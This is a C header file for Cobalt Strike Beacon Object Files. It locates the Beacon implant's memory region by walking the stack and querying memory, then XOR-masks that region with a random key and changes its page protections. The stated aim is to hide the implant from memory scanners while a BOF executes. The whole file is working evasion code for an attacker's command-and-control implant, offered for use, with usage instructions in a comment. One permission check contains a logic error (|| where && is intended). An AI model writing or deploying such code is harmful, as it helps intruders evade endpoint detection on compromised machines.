#include <windows.h>
#include <stdlib.h> //Need this for generating the mask
#include <time.h> //Need this for generating the mask
#include "beacon.h"
#define BOFMASK_DEBUG 1
/*
    This is a Header file to include in your BOFs that allows for masking Beacon in memory during BOF execution. If your BOF triggers a memory scan, this will hopefully prevent the scanner from finding Beacon in memory.

    USAGE: You can use this by calling GetBeaconBaseAddress to populate the global variables, and then using MaskBeacon/UnmaskBeacon to toggle the mask. You can toggle the mask at any point to call Beacon API functions before remasking.
    //Below is an example main BOF function.
    void go(char* args, int length){
        //YOUR CODE HERE, YOU MUST CALL ANY ARGUMENT UNPACKING FUNCTIONS BEFORE CALLING MaskBeacon
        GetBeaconBaseAddress();
        MaskBeacon();

        //YOUR CODE HERE
        //DO NOT CALL ANY BEACON APIS BETWEEN MASKING AND UNMASKING!!!!! IT WILL KILL YOUR BEACON!!!!!

        UnmaskBeacon();
        //YOUR CODE HERE, YOU CAN NOW CALL BEACON APIS AGAIN
    }
*/

//Can change this if you want a smaller or larger mask key
#define MASK_SIZE 13

//Need to do it like this so it doesn't go into the .bss section
void* bRBP __attribute__((section(".data"))) = NULL;
void* bRIP __attribute__((section(".data"))) = NULL;
void* bRSP __attribute__((section(".data"))) = NULL;

//Using globals to keep track of these
DWORD BOFMaskOldProtect __attribute__((section(".data"))) = 0; //For our VirtualProtect calls
char* beaconBaseAddress __attribute__((section(".data"))) = NULL; //The base address of the entire Beacon allocation
SIZE_T beaconSize __attribute__((section(".data"))) = 0; //The size of the entire Beacon allocation
unsigned char mask[MASK_SIZE];

void ApplyMask();
void MaskBeacon();
void UnmaskBeacon();
void GetBeaconBaseAddress();

//Functions we need for masking 
WINBASEAPI void* WINAPI MSVCRT$malloc(size_t size);
WINBASEAPI void* WINAPI MSVCRT$memcpy(void* destination, const void* source, size_t num);
WINBASEAPI SIZE_T WINAPI KERNEL32$VirtualQuery(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength);
WINBASEAPI WINBOOL WINAPI KERNEL32$VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
//Functions for generating our mask
WINBASEAPI time_t WINAPI MSVCRT$time(time_t *seconds);
WINBASEAPI void WINAPI MSVCRT$srand(unsigned int seed);
WINBASEAPI int WINAPI MSVCRT$rand(void);

//Apply an XOR mask to a beacon
void ApplyMask() {
   DWORD start = 0;
   while (start < beaconSize) {
      *(beaconBaseAddress + start) ^= mask[start % MASK_SIZE];
      start++;
   }
}

//Set RW protection on beacon and mask
void MaskBeacon() {
      KERNEL32$VirtualProtect(beaconBaseAddress, beaconSize, PAGE_READWRITE, &BOFMaskOldProtect);
      ApplyMask();
}

//Unmask and revert beacon to old protection
void UnmaskBeacon() {
      ApplyMask();
      KERNEL32$VirtualProtect(beaconBaseAddress, beaconSize, BOFMaskOldProtect, &BOFMaskOldProtect);
}

//Find Beacon's base address by getting the return address and calling VirtualQuery to find the base address and size of the allocation
void GetBeaconBaseAddress(){

    //Generate our mask
    //Note: you can roughly halve the size of this BOF by removing the stdlib functions and using a static key instead
    MSVCRT$srand((unsigned int) MSVCRT$time (NULL));
    for(int i = 0; i < MASK_SIZE; i++){
        mask[i] = MSVCRT$rand();
    }
    
    //Walk the stack frame to get Beacon's RIP
    __asm__(

        "mov r8, [rbp] \n"
        "mov rcx, [r8] \n"
        "mov rdx, [r8+0x8] \n"
        "mov rax, r8 \n"
        :"=r" (bRBP),
        "=r" (bRIP),
        "=r" (bRSP)
    );

    //Get information about Beacon's base address from the return address
    PMEMORY_BASIC_INFORMATION beaconMemoryInfo = MSVCRT$malloc(sizeof(MEMORY_BASIC_INFORMATION));
    KERNEL32$VirtualQuery(bRIP, beaconMemoryInfo, sizeof(MEMORY_BASIC_INFORMATION));
#ifdef BOFMASK_DEBUG
    BeaconPrintf(CALLBACK_OUTPUT, "Base address for current Beacon page: %p", beaconMemoryInfo->BaseAddress);
    BeaconPrintf(CALLBACK_OUTPUT, "Base allocation for current Beacon page: %p", beaconMemoryInfo->AllocationBase);
#endif
    //Now get information about the whole allocated region for beacon
    PMEMORY_BASIC_INFORMATION beaconAllocationInfo = MSVCRT$malloc(sizeof(MEMORY_BASIC_INFORMATION));
    KERNEL32$VirtualQuery(beaconMemoryInfo->AllocationBase, beaconAllocationInfo, sizeof(MEMORY_BASIC_INFORMATION));

    //Set our global variables assuming they're correct, we'll update them later if not 
    beaconBaseAddress = beaconAllocationInfo->AllocationBase;
    beaconSize = beaconAllocationInfo->RegionSize;

    //If the correct memory permissions are set then we'll need to skip the NT header to find the .text section
    if(beaconAllocationInfo->Protect != PAGE_EXECUTE_READ || beaconAllocationInfo->Protect != PAGE_EXECUTE_READWRITE){
        KERNEL32$VirtualQuery((ULONG_PTR)beaconAllocationInfo->AllocationBase + beaconAllocationInfo->RegionSize, beaconAllocationInfo, sizeof(MEMORY_BASIC_INFORMATION));
        //Verify that our Beacon page is within our suspected .text section
        if(beaconMemoryInfo->BaseAddress > beaconAllocationInfo->AllocationBase && beaconMemoryInfo->BaseAddress < (ULONG_PTR)beaconAllocationInfo->AllocationBase + beaconAllocationInfo->RegionSize){
            //Update our global variables
            beaconBaseAddress = beaconAllocationInfo->BaseAddress;
            beaconSize = beaconAllocationInfo->RegionSize;
        }
    }
    
#ifdef BOFMASK_DEBUG
    BeaconPrintf(CALLBACK_OUTPUT, "Base address of Beacon's .text section: %p, Size: %d, Base allocation: %p, Protect: %x, State: %x, Type: %x", beaconAllocationInfo->BaseAddress, beaconAllocationInfo->RegionSize, beaconAllocationInfo->AllocationBase, beaconAllocationInfo->Protect, beaconAllocationInfo->State, beaconAllocationInfo->Type);
#endif

    return;

}

